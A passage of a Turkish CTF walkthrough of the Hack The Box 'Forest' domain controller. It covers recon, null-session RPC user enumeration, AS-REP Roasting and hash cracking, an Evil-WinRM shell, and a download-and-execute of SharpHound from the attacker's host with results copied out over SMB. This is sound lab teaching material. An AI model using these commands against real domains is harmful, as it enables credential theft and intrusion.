---
{"dg-publish":true,"permalink":"/ctf/forest-htb-oscp-like/"}
---


HTB'nin en güzel yanlarından biri, daha önce karşılaştığım hiçbir CTF'ye benzemeyen Windows konseptlerini ortaya çıkarması. Forest bunun harika bir örneği. RPC üzerinden kullanıcıları listelememe, AS-REP Roasting ile Kerberos'a saldırı yapmama ve bir shell almak için Win-RM kullanmama izin veren bir domain controller. Daha sonra DCSycn yeteneklerini elde etmek için bu kullanıcının izinlerinden ve erişimlerinden faydalanabilirim, böylece admin kullanıcısı için hash'leri dump edebilir ve admin olarak bir shell elde edebilirim. Beyond Root bölümünde, DCSync'in kablo üzerinde nasıl göründüğüne ve izinleri temizleyen otomatik göreve bakacağım. "Beyond Root" kısmında, DCSync'in ağ trafiğinde nasıl göründüğünü inceleyeceğim ve izinleri temizleyen otomatik görevi analiz edeceğim.

## Box Info

|Name|[Forest](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fforest)[![Forest](https://0xdf.gitlab.io/icons/box-forest.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fforest)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fforest)|
|---|---|
|Release Date|[12 Oct 2019](https://twitter.com/hackthebox_eu/status/1215300155341266951)|
|Retire Date|21 Mar 2020|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Forest](https://0xdf.gitlab.io/img/forest-diff.png)|
|Radar Graph|![Radar chart for Forest](https://0xdf.gitlab.io/img/forest-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:20:45[![cube0x0](https://www.hackthebox.com/badge/image/9164)](https://app.hackthebox.com/users/9164)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|01:23:31[![cube0x0](https://www.hackthebox.com/badge/image/9164)](https://app.hackthebox.com/users/9164)|
|Creators|[![egre55](https://www.hackthebox.com/badge/image/1190)](https://app.hackthebox.com/users/1190)  <br>[![mrb3n](https://www.hackthebox.com/badge/image/2984)](https://app.hackthebox.com/users/2984)|



## Recon

### nmap

nmap, güvenlik duvarı olmayan Windows makinelerine özgü çok sayıda port gösterir:

```
root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.031s latency).
Not shown: 64742 closed ports, 769 filtered ports

PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
9389/tcp open adws
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
49671/tcp open unknown
49678/tcp open unknown
49697/tcp open unknown
49898/tcp open unknown

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
```


```
root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161

Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
Nmap scan report for 10.10.10.161
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-14T11:34:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-14T18:34:52
|_  start_date: 2019-10-14T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
```


Nmap Çıktsınından Tespit Ettiklerimiz 

### **1. Hedef Sistem ve Genel Bilgiler**

- **IP Adresi:** 10.10.10.161
- **İşletim Sistemi:** Windows Server 2016 Standard 14393
    - NetBIOS bilgisayar adı: `FOREST`
    - Domain: `htb.local`
    - Forest : `htb.local`
    - Zaman farkı: Sistem saatinde 2 saat 27 dakika sapma gözlemlenmiş.

Bu, hedefin bir Windows Active Directory (AD) ortamına ait olduğunu ve domain yönetimi için kullanılan bir sunucu olduğunu gösteriyor.


### **2. TCP Taraması (Belirli Portlar)**

#### **Açık TCP Portları ve Servisler**

| **Port** | **Durum** | **Hizmet**           | **Versiyon/Detaylar**                                                      |
| -------- | --------- | -------------------- | -------------------------------------------------------------------------- |
| **53**   | Open      | Domain (DNS?)        | DNS sunucusu çalışıyor, ancak servis tam tespit edilmedi.                  |
| **88**   | Open      | Kerberos             | Windows Kerberos kullanılıyor (zaman eşleşmesi: 2019-10-14 18:32:33Z).     |
| **135**  | Open      | Microsoft RPC        | Remote prosedür çağrıları için Microsoft RPC çalışıyor.                    |
| **139**  | Open      | NetBIOS-SSN          | NetBIOS oturumu servisi çalışıyor.                                         |
| **389**  | Open      | LDAP                 | Active Directory için LDAP servisi çalışıyor.                              |
| **445**  | Open      | Microsoft-DS         | SMB (dosya paylaşımı) için kullanılan bir port.                            |
| **464**  | Open      | kpasswd5             | Kerberos ile ilişkili, kullanıcı parolalarını değiştirmek için kullanılır. |
| **593**  | Open      | RPC over HTTP        | Microsoft RPC’nin HTTP üzerinden çalıştığını gösteriyor.                   |
| **636**  | Open      | TCP Wrapped          | Güvenli LDAP (LDAPS) olabilir ama paket analizine ihtiyaç var.             |
| **3268** | Open      | LDAP                 | Global Katalog (Global Catalog) sunucusu çalışıyor.                        |
| **3269** | Open      | TCP Wrapped          | Güvenli Global Katalog olabilir.                                           |
| **5985** | Open      | HTTP                 | Microsoft HTTPAPI kullanıyor, muhtemelen PowerShell Remoting.              |
| **9389** | Open      | .NET Message Framing | Windows’un .NET Message Framework servisi çalışıyor.                       |

#### **Önemli Notlar:**

- **SMB Security Modu:**
    - Mesaj imzalama zorunlu.
    - Kullanıcı doğrulaması gerekli.

Bu, SMB üzerinden güvenlik açıkları aramanın zor olabileceğini gösteriyor. Ancak, doğru kimlik bilgileriyle SMB üzerinden daha fazla bilgi toplanabilir.


### **3. UDP Taraması**

#### **Açık UDP Portları**

|**Port**|**Durum**|**Hizmet**|
|---|---|---|
|**123/udp**|Open|NTP (Network Time Protocol)|
|**389/udp**|Open|LDAP|
|**58399**|Open|Bilinmeyen (Unknown)|
|**58507**|Open|Bilinmeyen (Unknown)|

- **123/udp:** Sistem saatini eşitlemek için kullanılıyor olabilir. Zaman sapmasının dikkatle incelenmesi gerekebilir.
- **389/udp:** LDAP üzerinden iletişim için kullanılabilir.
- **Bilinmeyen UDP Portlar:** Paket analiziyle (Wireshark vb.) bu portların trafiği analiz edilerek hizmet tespiti yapılabilir.


### **4. Potansiyel Saldırı Yüzeyleri**

1. **Active Directory ve LDAP (389/3268 TCP/UDP):**
    
    - LDAP üzerinden bilgi toplama yapılabilir. Örneğin:

```
ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"
```

- Kullanıcı ve grup bilgileri elde edilebilir.
- Kimlik bilgileriyle LDAP üzerinden daha fazla yetki artırımı denenebilir.


2. **SMB (139/445):**

- SMB bağlantısı kurarak paylaşılan dosyalar araştırılabilir:

```
smbclient -L //10.10.10.161 -U ''
```

* Null oturumlarla (anonim bağlantılar) bilgi alınabilir.


3. **Kerberos (88/464):**

- Kerberos kimlik doğrulama açıkları araştırılabilir.
- **ASREPRoast ve Kerberoasting** gibi teknikler uygulanabilir:

```
impacket-GetNPUsers htb.local/ -no-pass
```


4. **RPC (135/593):**

- RPC üzerinden servis sorgulamaları yapılabilir:

```
rpcclient -U '' 10.10.10.161
```



5. **NTP (123/udp):**

- NTP hizmetinin kötü yapılandırılmış olup olmadığı kontrol edilebilir.


### **5. Genel Yorum**

- Hedef, bir Active Directory ortamında yer alan bir Windows Server 2016 makinesi.
- LDAP, Kerberos ve SMB servisleri ön planda. Bu servisler, bilgi toplama ve istismar için değerlendirilebilir.
- Özellikle LDAP, SMB ve Kerberos üzerinden bilgi toplama yapılabilir.
- Daha fazla analiz için hedef üzerinde paket analizi (Wireshark) ve kimlik doğrulama denemeleri yapılabilir.



Bu bir domain controller'a benziyor. Ayrıca TCP/5985'i de göreceğim, yani bir kullanıcının kimlik bilgilerini bulabilirsem, WinRM üzerinden bir shell alabilirim.



### DNS - UDP/TCP 53

Bu DNS sunucusundan ==htb.local== ve ==forest.htb.local== adreslerini çözümleyebiliyorum:


```
root@kali# dig  @10.10.10.161 htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62514
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: bbee567cd8172763 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161

;; Query time: 30 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Mon Oct 14 14:34:17 EDT 2019
;; MSG SIZE  rcvd: 66




root@kali# dig  @10.10.10.161 forest.htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12842
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: ca9fa59dce2451be (echoed)
;; QUESTION SECTION:
;forest.htb.local.              IN      A

;; ANSWER SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161

;; Query time: 150 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Mon Oct 14 14:35:19 EDT 2019
;; MSG SIZE  rcvd: 73
```

Ama zone transfer yapmama izin vermiyor:

```
root@kali# dig axfr  @10.10.10.161 htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```



### SMB - TCP 445

Ne smbmap ne de smbclient parola olmadan paylaşımları listelememe izin vermiyor:


```
root@kali# smbmap -H 10.10.10.161
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.161...
[+] IP: 10.10.10.161:445        Name: 10.10.10.161                                      
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied


root@kali# smbmap -H 10.10.10.161 -u 0xdf -p 0xdf
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.161


root@kali# smbclient -N -L //10.10.10.161
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.161]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```


### RPC - TCP 445

Kullanıcıları listelemek için RPC üzerinden kontrol etmeyi deneyebilirim. [BlackHills'in bu konuda](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) iyi bir yazısı var. Yazının türkçelşetirilmiş hali --> [[Bağlantılar/BlackHills-T\|BlackHills-T]]

Null auth ile bağlanacağım:

```
root@kali# rpcclient -U "" -N 10.10.10.161
rpcclient $>
```

`Enumdomusers` ile kullanıcıların bir listesini alabilirim:

```
rpcclient $> enumdomusers              
user:[Administrator] rid:[0x1f4]       
user:[Guest] rid:[0x1f5]               
user:[krbtgt] rid:[0x1f6]              
user:[DefaultAccount] rid:[0x1f7]      
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]
```

Grupları da listeleyebilirim:

```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]          
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]            
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]                 
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

Ayrıca bir grubun üyelerini de inceleyebilirim. Örneğin, **Domain Admins** grubunun bir üyesi var, RID 0x1f4:

```
rpcclient $> querygroup 0x200          
        Group Name:     Domain Admins     
        Description:    Designated administrators of the domain
        Group Attribute:7              
        Num Members:1                  
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

**`querygroupmem 0x200`**

- Bu komut, belirtilen grubun üyelerini listeler.
- **0x200**, üyeleri sorgulanan grubun RID'sidir.
- Çıktıda her üyenin RID’si `(rid:[0x1f4])` ve bu üyeye atanan attribute'lar (**`attr:[0x7]`**) görüntülenir.

İlk komutla grup hakkında genel bilgi alınır, ikinci komutla grubun hangi kullanıcı ya da hesaplara sahip olduğu öğrenilir. Bu, özellikle Active Directory ortamında yetkili hesapları belirlemek için kullanılır.

```
rpcclient $> queryuser 0x1f4            
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :   
        Dir Drive   :      
        Profile Path:      
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT
        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT
        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000031
        padding1[0..7]...
        logon_hrs[0..21]...
```



## Shell as svc-alfresco

### AS-REP Roasting

Daha önce hem **Active** hem de **Sizzle** senaryolarında **Kerberoasting** saldırısını ele almıştım. Genellikle, bu saldırı için domain üzerinde kimlik doğrulama yapacak bir hesaba ihtiyaç duyulur. Ancak, bir hesabın "Kerberos ön kimlik doğrulama gerektirme" (veya **UF_DONT_REQUIRE_PREAUTH** bayrağı) özelliği **true** olarak ayarlanmış olabilir. **AS-REP Roasting**, bu tür hesaplara yönelik bir Kerberos saldırısıdır.

Yukarıdaki RPC sorgulamasından elde ettiğim hesapların bir listesine sahibim. **SM*** veya **HealthMailbox*** ile başlayan hesapları liste dışı tutarak işe başlayacağım.

```
root@kali# cat users
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```


Artık Impacket aracı GetNPUsers.py'yi kullanarak her kullanıcı için bir hash almaya çalışabilirim ve svc-alfresco hesabı için bir tane buldum:

```
root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
```

---

Bu kod, bir Python scripti olan **GetNPUsers.py** kullanarak **AS-REP Roasting** saldırısını gerçekleştirmek için kullanıcıların **Kerberos ön kimlik doğrulama gereksinimi** olup olmadığını kontrol eder. İşte kodun yaptığı işlemler madde madde:

1. **`for user in $(cat users)`**
    
    - **`users`** dosyasındaki her bir kullanıcı adını tek tek alır ve döngüye sokar.
    - Dosyanın her satırında bir kullanıcı adı bulunur.
2. **`GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}`**
    
    - **GetNPUsers.py** aracı çalıştırılır ve belirtilen kullanıcı üzerinde işlem yapılır:
        
        - **`-no-pass`**: Kullanıcı şifresi gerekmeksizin işlem yapılacağını belirtir.
        - **`-dc-ip 10.10.10.161`**: İşlem yapılacak **Domain Controller** (DC) IP adresini belirtir.
        - **`htb/${user}`**: Kullanıcıyı **htb** domain'ine ait olarak hedefler.
    - Bu araç, kullanıcının **Kerberos ön kimlik doğrulama gereksinimi** kapalıysa (UF_DONT_REQUIRE_PREAUTH bayrağı açık) bir **AS-REP** bileti almayı dener.
        
3. **`| grep -v Impacket`**
    
    - Çıktı, **grep** komutuyla filtrelenir.
    - **`-v Impacket`**, **Impacket** modülüyle ilgili gereksiz bilgi veya hata mesajlarını filtreleyerek yalnızca önemli çıktının görüntülenmesini sağlar.
4. **Tüm döngüyü çalıştırma:**
    
    - **`done`** ifadesi, döngünün tamamlanacağını belirtir.
    - Kullanıcı listesindeki her kullanıcı için işlem yapılır ve uygun olanların **AS-REP** biletleri döndürülür.

### **Amaç:**

Bu kod, domain kullanıcıları arasından **Kerberos ön kimlik doğrulama gereksinimi** kapalı olanları tespit eder. Bu kullanıcılar için **AS-REP Roasting** saldırısı yapılabilir, yani biletler alınıp offline brute force ile şifreler çözülebilir.

Cheat Sheet' inize eklemek isterseniz kodun ham hali : 

```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip <DomainController_IP> mydomain/${user} | grep -v Impacket; done
```

---


### Crack Hash

Şimdi hash'i kırmak için hashcat'i kullanabilirim:

```
root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
...[snip]...
$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$
5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004
d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice
...[snip]...
```

Not : Hashcat'ın **18200** modu, **Kerberos AS-REP** (Authentication Service Response) şifre çözme modudur. Bu mod, **AS-REP Roasting** saldırısı sonucu alınan Kerberos biletlerini şifre çözmek için kullanılır.

Şifrenin “==s3rvice==” olduğunu görüyorum.


### WinRM

Bu kimlik bilgilerini Evil-WinRM ile deneyeceğim ve çalışıyor:

```
root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                                         
Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
                                                         
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

Buradan user.txt dosyasını alabilirim:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt e5e4e47a************************
```



## Privesc to Administrator

### Enumeration

#### SharpHound

Shell'im ile BloodHound için veri toplamak üzere SharpHound'u çalıştıracağım. Makinemde Bloodhound'un bir kopyası var (yoksa git clone https://github.com/BloodHoundAD/BloodHound.git adresini kullanabilirsiniz). `Ingestors` dizininde bir Python web sunucusu başlatacağım ve ardından mevcut oturumuma yükleyeceğim:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")
```

Now I’ll invoke it:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

Sonuç bir zip dosyasıdır:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir

    Directory: C:\Users\svc-alfresco\appdata\local\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/18/2019   3:56 AM          12740 20191018035650_BloodHound.zip
-a----       10/18/2019   3:56 AM           8978 Rk9SRVNU.bin   
```

---

1. **SharpHound.ps1 dosyasının indirilmesi**:
    
    - İlk olarak, `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")` komutu ile SharpHound.ps1 dosyası indiriliyor. Bu komut, hedef sistemde PowerShell aracılığıyla bir web sunucusundan `SharpHound.ps1` dosyasını indirir ve çalıştırır.
2. **Invoke-BloodHound ile çalıştırılması**:
    
    - Daha sonra `invoke-bloodhound` komutu ile SharpHound'u çalıştırıyor. Burada birkaç parametre bulunmaktadır:
        - `-collectionmethod all`: Tüm koleksiyon yöntemlerini kullanarak (örneğin: kullanıcılar, gruplar, yetkilendirme ilişkileri) veri toplar.
        - `-domain htb.local`: Hedef Active Directory alanı.
        - `-ldapuser svc-alfresco`: LDAP kullanıcı adı.
        - `-ldappass s3rvice`: LDAP şifresi.

Bu iki komut arasındaki fark, biri SharpHound.ps1 dosyasını indirip çalıştırırken, diğeri topladığı verileri BloodHound'a aktarmak içindir. SharpHound, Active Directory (AD) yapılandırmalarını analiz eder ve daha sonra bu topladığı verileri BloodHound'a entegre eder. BloodHound, toplanan bu verileri görselleştirir ve güvenlik açıklarını ortaya çıkarır.

---

Sonuçları exfil etmek için `smbserver.py` kullanacağım. Benim kutumda:

```
root@kali# smbserver.py share . -smb2support -username df -password df
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed                                   
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed                                   
[*] Config file parsed                                   
[*] Config file parsed     
```


Şimdi Forest'ta:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.14.6\share /u:df df
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20191018035324_BloodHound.zip \\10.10.14.6\share\

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20191018035324_BloodHound.zip   

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.14.6\share
\\10.10.14.6\share was deleted successfully.
```


#### Load Data

Bloodhound'un kurulumunu [Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html#bloodhound) yazımda anlatmıştım. Verileri yüklemek için

![Pasted image 20250106175637.png](/img/user/resimler/Pasted%20image%2020250106175637.png)

butonuna tıklıyorum ve zip exfil'imi seçiyorum. “ Queries” altında, “Find Shorter Paths to Domain Admin” seçeneğine tıklayacağım ve aşağıdaki grafiği elde edeceğim:

![Pasted image 20250106175703.png](/img/user/resimler/Pasted%20image%2020250106175703.png)

---
Grafik, bir Active Directory ortamındaki kullanıcılar ve gruplar arasındaki erişim ilişkilerini gösteriyor. Şu anki erişim noktanız olan svc-alfresco@HTB.LOCAL'dan Administrator@HTB.LOCAL (Domain Admins grubunun üyesi) seviyesine erişmek için hangi adımları izlemeniz gerektiğini açıklıyor.

### Grafik Üzerinden Anlamı:

